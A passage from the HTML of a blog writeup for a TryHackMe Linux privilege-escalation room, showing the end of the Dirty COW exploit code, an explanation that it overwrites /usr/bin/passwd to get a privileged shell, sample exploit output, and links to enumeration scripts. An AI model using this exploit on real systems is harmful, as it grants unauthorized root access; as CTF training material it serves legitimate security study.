+  pthread_join(pth3, NULL);
+
+  return 0;
+}
+</code></pre><p>The <code>dirty cow</code> exploit creates a binary, which back up <code>/usr/bin/passwd</code> file and creates a <code>reverse shell</code> payload in the same name. A <code>privilege shell</code> will be spawned when the command <code>/usr/bin/passwd</code> is executed.</p><p>The output of command <code>./c0w</code> is similar to below</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="DirtyCow%20root%20privilege%20escalation%0ABacking%20up%20/usr/bin/passwd%20to%20/tmp/bak%0Ammap%20249f7000%0A%0Amadvise%200%0A%0Aptrace%200" type="button"></button></div></div><pre><code>DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap 249f7000
+
+madvise 0
+
+ptrace 0
+</code></pre><h2 id="task-21---privilege-escalation-scripts">Task 21 - Privilege Escalation Scripts</h2><h3 id="references-6">References</h3><ul><li><a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum reference</a><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank">Privilege Escalation Suite</a><li><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">Linux Smart Enumeration</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-common-linux-privesc/"><div class="card-body"> <span class="timeago small" > Apr 2 <i class="unloaded">2021-04-02T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Common Linux Privesc</h3><div class="text-muted small"><p> Common Linux Privesc This room contains info about linux privilege escalation methods. For complete tryhackme path, refer the link. Task 4 - Enumeration References LinEnum Reference ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-blue/"><div class="card-body"> <span class="timeago small" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Blue</h3><div class="text-muted small"><p> Blue This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeratio...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-common-linux-privesc/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Common Linux Privesc</p></a> <a href="/posts/tryhackme-advent-of-cyber/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Advent of Cyber</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
